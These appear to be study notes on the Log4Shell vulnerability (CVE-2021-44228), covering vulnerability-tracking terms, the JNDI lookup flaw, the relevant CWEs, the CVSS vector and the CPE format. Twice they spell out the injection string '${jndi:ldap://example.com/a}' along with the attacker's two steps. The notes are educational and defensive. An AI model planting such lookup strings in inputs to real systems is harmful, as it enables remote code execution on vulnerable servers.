# Log4Shell - CVE-2021-44228
Remote Code Execution (RCE) vuln (= Weakness that can be exploited) in Apache Log4j.

Glossary:
- **CVE** : Common Vulnerability and Exposure - Track Vulnerabilities
A Dictionary of common names for publicly known iformation system vulnerabilities.
- **CWE**:  Common weakness enumeration - Weakness classification
A list of known poor coding practices that may be present in SW
- **CVSS**: Common vulnerability scoring system - Risk assesment
A system for measuring  the relative severity of SW flaws vulnerabilities
- **CPE**: Common Platform Enumeration - Identify affected SW
A Nomenclature and dicionary of  HW, OS and Applications
U should have a CPE for every Item in the Company to check with crawler to see if some attacks are on intrest. (Thoo it's a lot of work).
- **KEV** (Known Exploited Vulnerabilities) and **SSVC** (Stakeholder-Speific Vulnerability Categorization)
KEV - Vulnerabilities in the wild, known to everyone
SSVC - Scoring system for critical infrastructures
- **ADP**: Autorized Data Publishers
Enrich CVEs with scores, informations affected products and versions.
- **NVD**: National Vulnerability Database
USA DB on CVE

## Understanding Log4Shell
**Log4J**: java Lib to log securly; use to be in any enterprise Java SW.
**Log4Shell**: Apache Log4j2 JNDI (Java Naming and Directory Interface) features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP (Lightweight Directory Access Protocol - interrogation of directory services, mostly used for Central handling of  Accounts) and other JNDI related endpoints. 
An attacker *who can control log messages* or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.

### Tecnical 

LDAP can retrieve objects form anywere on the internet with a URL

ldap://localhost:389/o=JNDITutorial

The problem: if an attacker could control the LDAP URL they’d be able to cause a Java program to load an object from a server under their control.

And that's what happened:

Note that when **logging a sting**, **Log4J** does string substitution, like:
- ${prefix:name}
- Text: ${java:version} --> Text: Java version 1.7.0_67

Log4J2-313 added the possibility to use a "jndi" lookup (The JndiLookup allows variables to be retrieved via JNDI). Default is prefixed with *java:comp/env/*, **BUT** if the key contains a "**:**" noprefix will be added.
So this query became possible:
- ${jndi:ldap://example.com/a}
Thaking the variable from the website **OR a malicious class, crafted to attack when executed.**

The attacker had to:
1) find an input that got logged
2) Input a string like ${jndi:ldap://example.com/a} to be logged

This is not a difficult event, it's very common to log usernames, chats and so. A lot of Entrypoint were affected.

## CWE of Log4Shell
CWE-502: Deserialization of Untrusted Data 
- The product deserializes untrusted data without sufficiently ensuring that the resulting data will be valid.
- Attackers can modify unexpected objects or data that was assumed to be safe from modification.
- The reults of the jndi were considered safe.

CWE-400: Uncontrolled Resource Consumption:
- The product does not properly control the allocation and maintenance of a limited resource.
- Happened because you could make run any code, possibly occupying resources and Dos.

CWE-20: Improper Input Validation 
- The product receives input or data, but it does not validate or incorrectly validates that the input has the properties that are required to process the data safely and correctly.
- This happened in the ${jndi: string, there was no control on what type could be referenced, no control whatsoever on the input

## CVSS Score
Vector:  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H 
- **AV**: Attack Vector
    - N - Network
    - A - Adjacent Nw
    - L - Local
    - P - Phisical
- **AC**: Attack Complexity
    - L - Low
    - H - High
- **PR**: Privilage Required
    - N - None
    - L - Low
    - H - High
- **UI**: User interaction
    - N - None
    - R - Required
- **S**: Scope (can impact stuff beyond its resources)
    - U: Unchanged
    - C: Changed
IMPACT METRICS:     [N - None; L - Low; H - High]
- **C**: Confidentiality impact
- **I**: Integrity impact
- **A**: Avialibility impact

## CPE - Affected SW
Uses URI to define SW, HW, version, productor.
Has a Naming Format for specific search filters.
- Prefix (cpe:2.3): Identifies the CPE version.
- Part (p): Type of product (a = application, o = operating system, h = hardware).
- Vendor: Company or organization that created the product.
- Product: The name of the software or hardware.
- Version: The product's version identifier.
- Update: Information on patches or service packs.
- Edition: Further product differentiation (rarely used now).
- Language: Language code

